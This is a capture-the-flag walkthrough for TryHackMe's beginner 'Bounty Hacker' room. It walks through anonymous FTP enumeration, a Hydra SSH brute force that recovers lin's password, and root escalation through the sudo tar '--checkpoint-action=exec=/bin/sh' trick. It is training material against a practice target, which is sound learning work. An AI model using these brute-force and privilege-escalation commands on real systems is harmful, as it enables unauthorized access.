# Bounty Hacker — Walkthrough

🔗 **TryHackMe Room:** [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

![Bounty Hacker logo](./bounty-hacker-logo.png)

```diff
> anonymous FTP leaks the clues • Hydra finds the key • sudo tar opens the throne room
```

---

## ℹ️ Information

- **Platform:** TryHackMe
- **Difficulty:** Beginner
- **Theme:** space cowboy bounty hacker chaos, but make it terminal-friendly
- **Goal:** get SSH access, retrieve `user.txt`, escalate to `root`, then retrieve `root.txt`
- **Exposed services:** FTP, SSH, and HTTP
- **Main techniques:** anonymous FTP enumeration, password brute forcing, sudo privilege escalation

---

## 🧠 Reconnaissance

### Port Scan

Start with a service scan. The exact command can vary, but the goal is to identify what is reachable and what versions are running:

```bash
nmap -sC -sV -oN nmap.txt bountyhacker.thm
```

Important results:

```text
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

The scan gives us three doors:

- FTP on port `21`
- SSH on port `22`
- HTTP on port `80`

The spicy line is FTP. The Nmap output shows anonymous login is allowed:

```text
ftp-anon: Anonymous FTP login allowed
```

👉 **Insight:**
When anonymous FTP is enabled in a CTF, do not politely walk past it. That is the room waving a neon sign that says, "Please download my suspicious little files."

---

## 📂 FTP Enumeration

Connect to FTP using the anonymous account:

```bash
ftp anonymous@bountyhacker.thm
```

After logging in, list the files:

```text
ftp> ls
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

Download both files:

```text
ftp> get locks.txt
ftp> get task.txt
ftp> exit
```

Now inspect them locally:

```bash
cat task.txt
```

Result:

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

That signature at the bottom is the key detail. The file was written by `lin`, which gives us a likely username.

Next, inspect `locks.txt`:

```bash
cat locks.txt
```

It contains a list of dragon-themed candidate passwords, including entries like:

```text
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
RedDr4gonSynd1cat3
ReDSynd1ca7e
```

So now we have:

- **Possible username:** `lin`
- **Password list:** `locks.txt`

👉 **Insight:**
The target basically handed us a username and a wordlist. In bounty hunter terms, this is less "tracking a criminal across the galaxy" and more "the criminal left a forwarding address and a snack receipt."

---

## 🔐 Credential Attack

Create a small username file:

```bash
echo lin > user.txt
```

Then use Hydra against SSH:

```bash
hydra -L user.txt -P locks.txt ssh://bountyhacker.thm
```

Hydra finds valid credentials:

```text
[22][ssh] host: bountyhacker.thm   login: lin   password: RedDr4gonSynd1cat3
```

Credentials:

```text
lin:RedDr4gonSynd1cat3
```

👉 **Insight:**
This is why leaked wordlists matter. A password list does not need to be huge if it is tailored to the target. Twenty-six good guesses can beat a million random ones when the theme is doing half the work.

---

## 🐚 SSH Access

Log in over SSH:

```bash
ssh lin@bountyhacker.thm
```

Use the password found by Hydra:

```text
RedDr4gonSynd1cat3
```

Once connected, you land as `lin`:

```text
lin@ip-10-65-138-64:~/Desktop$
```

From here, look around and read the user flag:

```bash
ls
cat user.txt
```

🚩 User access is complete.

👉 **Insight:**
The first shell is not the finish line. It is the lobby. Take a breath, check your privileges, and do not knock over the furniture unless the furniture has SUID bits.

---

## ⬆️ Privilege Escalation

### Sudo Permissions

Check what `lin` can run with elevated privileges:

```bash
sudo -l
```

Result:

```text
User lin may run the following commands on ip-10-65-138-64:
    (root) /bin/tar
```

That is our escalation path. The user `lin` can run `/bin/tar` as `root`.

This is where GTFOBins becomes the cyberpunk spellbook.

### Abusing tar

GTFOBins documents a sudo technique for `tar` using checkpoint actions. Run:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

You should land in a root shell:

```text
# whoami
root
```

Why this works:

- `tar` is allowed through sudo as `root`.
- `--checkpoint=1` triggers an action during archive processing.
- `--checkpoint-action=exec=/bin/sh` tells `tar` to execute `/bin/sh`.
- Because `tar` is running as `root`, the shell runs as `root`.

In normal admin life, `tar` archives files. In CTF life, `tar` sometimes turns into a tiny elevator to the penthouse.

👉 **Insight:**
Always check `sudo -l` after getting a shell. A single allowed binary can be enough for full compromise if it supports command execution.

---

## 👑 Root Flag

Find the root flag:

```bash
find / -type f -name root.txt 2>/dev/null
```

The flag is located at:

```text
/root/root.txt
```

Read it:

```bash
cat /root/root.txt
```

Root flag:

```text
THM{REDACTED}
```

---

## 🧠 Final Thoughts

This room teaches a very clean beginner attack chain:

- service enumeration
- anonymous FTP access
- clue extraction from downloaded files
- SSH brute forcing with a targeted wordlist
- sudo privilege escalation using GTFOBins

The whole path is simple, but it rewards paying attention. The username is not hidden behind ten layers of cosmic encryption. It is signed at the bottom of a note like someone in the future still believes in email signatures.

---

```diff
> FTP gave us the clue • Hydra found the door code • tar became the root elevator
```

## 🔗 References

- [TryHackMe - Bounty Hacker](https://tryhackme.com/room/cowboyhacker)
- [GTFOBins - tar](https://gtfobins.github.io/gtfobins/tar/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)

---

The original solving notes are preserved in [BountyHacker-Notes.md](BountyHacker-Notes.md).
